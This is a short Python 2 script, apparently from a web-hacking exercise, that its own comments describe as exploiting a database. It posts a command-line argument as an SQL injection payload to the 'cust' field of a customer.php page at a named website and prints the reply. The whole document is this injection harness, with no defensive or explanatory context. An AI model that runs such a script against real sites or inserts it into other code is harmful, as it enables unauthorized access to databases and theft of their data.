# @author Melinda Sherrill
# Goes to website, expoits database
import requests
import sys

# Input the URL running the .php file that connects to db
BASEURL = "http://frechetta.me/WebHack/php/customer.php"
SESSION = requests.Session()


# Gets session url
def postURL(url, data):
    return SESSION.post(format(url), data).text


# Sends payload injection to sql query in customer php
def evaluateSQL(cond):
    payload = cond
    response = postURL(BASEURL, {"cust": payload})
    return response

print evaluateSQL(sys.argv[1])
